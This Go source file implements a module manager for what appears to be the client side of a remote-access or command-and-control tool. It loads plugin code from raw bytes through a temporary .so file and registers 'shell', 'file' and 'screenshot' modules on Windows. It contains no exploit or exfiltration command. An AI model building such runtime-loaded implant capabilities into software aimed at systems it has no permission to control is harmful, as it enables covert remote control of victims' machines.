package module

import (
    "context"
    "encoding/json"
    "errors"
    "fmt"
    "io/ioutil"
    "os"
    "plugin"
    "runtime"
    "sync"
    
    "github.com/Cl0udRs4/dinot/internal/client/module/shell"
)

var (
    // ErrModuleNotFound is returned when a module is not found
    ErrModuleNotFound = errors.New("module not found")
    
    // ErrModuleAlreadyLoaded is returned when a module is already loaded
    ErrModuleAlreadyLoaded = errors.New("module already loaded")
)

// ModuleManager manages client modules
type ModuleManager struct {
    modules map[string]Module
    mu      sync.RWMutex
}

// NewModuleManager creates a new module manager
func NewModuleManager() *ModuleManager {
    return &ModuleManager{
        modules: make(map[string]Module),
    }
}

// LoadModule loads a module
func (m *ModuleManager) LoadModule(module Module) error {
    m.mu.Lock()
    defer m.mu.Unlock()
    
    name := module.GetName()
    if _, exists := m.modules[name]; exists {
        return ErrModuleAlreadyLoaded
    }
    
    err := module.Init()
    if err != nil {
        return err
    }
    
    m.modules[name] = module
    return nil
}

// UnloadModule unloads a module
func (m *ModuleManager) UnloadModule(name string) error {
    m.mu.Lock()
    defer m.mu.Unlock()
    
    module, exists := m.modules[name]
    if !exists {
        return ErrModuleNotFound
    }
    
    err := module.Cleanup()
    if err != nil {
        return err
    }
    
    delete(m.modules, name)
    return nil
}

// ExecuteModule executes a module
func (m *ModuleManager) ExecuteModule(ctx context.Context, name string, params json.RawMessage) (json.RawMessage, error) {
    m.mu.RLock()
    module, exists := m.modules[name]
    m.mu.RUnlock()
    
    if !exists {
        return nil, ErrModuleNotFound
    }
    
    return module.Execute(ctx, params)
}

// GetModules returns a list of loaded modules
func (m *ModuleManager) GetModules() []string {
    m.mu.RLock()
    defer m.mu.RUnlock()
    
    modules := make([]string, 0, len(m.modules))
    for name := range m.modules {
        modules = append(modules, name)
    }
    
    return modules
}

// GetModule returns a module by name
func (m *ModuleManager) GetModule(name string) (Module, error) {
    m.mu.RLock()
    defer m.mu.RUnlock()
    
    module, exists := m.modules[name]
    if !exists {
        return nil, ErrModuleNotFound
    }
    
    return module, nil
}

// LoadModuleFromBytes loads a module from a byte array
func (m *ModuleManager) LoadModuleFromBytes(name string, moduleBytes []byte) error {
    m.mu.Lock()
    defer m.mu.Unlock()
    
    if _, exists := m.modules[name]; exists {
        return ErrModuleAlreadyLoaded
    }
    
    // Platform-specific module loading
    var module Module
    var err error
    
    switch runtime.GOOS {
    case "linux", "darwin":
        module, err = m.loadPluginModule(name, moduleBytes)
    case "windows":
        module, err = m.loadWindowsModule(name, moduleBytes)
    default:
        return fmt.Errorf("unsupported platform: %s", runtime.GOOS)
    }
    
    if err != nil {
        return fmt.Errorf("failed to load module: %w", err)
    }
    
    // Initialize the module
    err = module.Init()
    if err != nil {
        return fmt.Errorf("failed to initialize module: %w", err)
    }
    
    // Store the module
    m.modules[name] = module
    
    return nil
}

// loadPluginModule loads a module using Go's plugin package (Linux/macOS)
func (m *ModuleManager) loadPluginModule(name string, moduleBytes []byte) (Module, error) {
    // Create a temporary file
    tmpFile, err := ioutil.TempFile("", "module-*.so")
    if err != nil {
        return nil, fmt.Errorf("failed to create temporary file: %w", err)
    }
    defer os.Remove(tmpFile.Name())
    
    // Write the module bytes to the file
    _, err = tmpFile.Write(moduleBytes)
    if err != nil {
        return nil, fmt.Errorf("failed to write module bytes: %w", err)
    }
    
    // Close the file
    err = tmpFile.Close()
    if err != nil {
        return nil, fmt.Errorf("failed to close temporary file: %w", err)
    }
    
    // Load the module using the plugin package
    plugin, err := plugin.Open(tmpFile.Name())
    if err != nil {
        return nil, fmt.Errorf("failed to load module: %w", err)
    }
    
    // Look up the "NewModule" symbol
    newModuleSym, err := plugin.Lookup("NewModule")
    if err != nil {
        return nil, fmt.Errorf("module does not export 'NewModule': %w", err)
    }
    
    // Assert that the symbol is a function
    newModule, ok := newModuleSym.(func() Module)
    if !ok {
        return nil, fmt.Errorf("module's 'NewModule' is not a function")
    }
    
    // Create a new module instance
    return newModule(), nil
}

// loadWindowsModule loads a module on Windows (alternative implementation)
func (m *ModuleManager) loadWindowsModule(name string, moduleBytes []byte) (Module, error) {
    // On Windows, we can use a different approach since Go plugins aren't supported
    // This could involve using a predefined set of modules or a different dynamic loading mechanism
    
    // For now, we'll implement a simple module registry approach
    switch name {
    case "shell":
        // Import the shell module
        // In a real implementation, this would be dynamically determined
        return shell.NewModule(), nil
    case "file":
        // return file.NewModule(), nil
        return nil, fmt.Errorf("file module not implemented yet")
    case "screenshot":
        // return screenshot.NewModule(), nil
        return nil, fmt.Errorf("screenshot module not implemented yet")
    default:
        return nil, fmt.Errorf("unknown module: %s", name)
    }
}

// IsModuleLoaded checks if a module is loaded
func (m *ModuleManager) IsModuleLoaded(name string) bool {
    m.mu.RLock()
    defer m.mu.RUnlock()
    
    _, exists := m.modules[name]
    return exists
}
